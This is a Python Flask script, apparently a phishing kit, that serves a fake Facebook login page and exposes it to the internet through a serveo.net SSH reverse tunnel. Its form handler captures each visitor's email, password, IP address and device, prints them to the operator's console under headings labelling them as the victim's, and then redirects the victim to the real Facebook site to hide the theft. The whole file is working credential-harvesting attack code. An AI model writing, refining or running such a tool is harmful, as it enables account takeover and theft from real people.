import os
import uuid
import sys
from flask import Flask, request, send_from_directory, redirect
import threading
import subprocess

# Configuración de Flask
app = Flask(__name__)

# Genera un UUID único
def generate_unique_id():
    return str(uuid.uuid4())

# Ruta para servir el archivo HTML de la carpeta "webs/Facebook"
@app.route('/')
def index():
    return send_from_directory('webs/Facebook', 'index.html')

# Ruta para manejar el envío del formulario
@app.route('/submit_form', methods=['POST'])
def submit_form():
    email = request.form['email']
    password = request.form['password']

    # Limpiar la terminal
    os.system('clear' if os.name == 'posix' else 'cls')

    # Mostrar los datos en el formato especificado
    print("\n𝐂𝐎𝐑𝐑𝐄𝐎 𝐄𝐋𝐄𝐂𝐓𝐑Ó𝐍𝐈𝐂𝐎/𝐍Ú𝐌𝐄𝐑𝐎 𝐃𝐄 𝐓𝐄𝐋É𝐅𝐎𝐍𝐎 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀.---")
    print(f"{email}\n")
    print("𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄Ñ𝐀.---")
    print(f"{password}\n")
    print("𝐈𝐏.---")
    print(f"{request.remote_addr}\n")
    print("𝐃𝐈𝐒𝐏𝐎𝐒𝐈𝐓𝐈𝐕𝐎.---")
    print(f"{request.user_agent.platform}\n")
    print("𝐏𝐀𝐈𝐒.---")
    print("Por implementar")  # Aquí se puede implementar el uso de una API de geolocalización si es necesario.
    print("\n𝐂𝐈𝐔𝐃𝐀𝐃.---")
    print("Por implementar")
    print("\n𝐂𝐎𝐃𝐈𝐆𝐎 𝐏𝐎𝐒𝐓𝐀𝐋.---")
    print("Por implementar\n")
    print("🤬𝑫𝚯𝚭𝚭𝚬𝑅來𝚳𝚾〽️\n")
    print("☠️𝐃𝐎𝐌𝐈𝐍𝐀.\n")

    # Redirigir al usuario a Facebook
    return redirect('https://www.facebook.com')

def run_server():
    app.run(host='0.0.0.0', port=5001)

def start_serveo():
    # Conectar a Serveo y redirigir el puerto 5001
    process = subprocess.Popen(['ssh', '-R', '80:localhost:5001', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    url = ''
    for line in process.stdout:
        if b'http' in line:
            url = line.decode().strip()
            break
    return url

def main():
    unique_id = generate_unique_id()  # Genera un UUID único

    # Banner en color rojo
    banner = '''
\033[95m  _________  _   _ ____   ___ __________ ____   
 |__  /  _ \| | | |  _ \ / _ \__  / ____|  _ \  
   / /| |_) | |_| | | | | | | |/ /|  _| | |_) | 
  / /_|  __/|  _  | |_| | |_| / /_| |___|  _ <  
 /____|_|   |_| |_|____/ \___/____|_____|_| \_\ 
                                              \033[95m
    '''
    print(banner)

    # Mostrar menú para selección de opciones
    def mostrar_menu():
        print("\nOpciones:")
        print("1: Iniciar servidor")
        print("2: Salir")

        opcion = input("Elige una opción (1/2): ").strip()

        if opcion == '1':
            server_thread = threading.Thread(target=run_server)
            server_thread.daemon = True
            server_thread.start()
            print("Servidor en ejecución en http://localhost:5001")
            url_serveo = start_serveo()
            if url_serveo:
                print(f"Tu servidor está disponible en: {url_serveo}")
            else:
                print("No se pudo obtener la URL de Serveo.")
            input("Presiona Enter para salir...")
        elif opcion == '2':
            print("Saliendo...")
            sys.exit()
        else:
            print("Opción inválida. Inténtalo de nuevo.")
            mostrar_menu()  # Mostrar el menú nuevamente en caso de opción inválida

    mostrar_menu()

if __name__ == '__main__':
    main()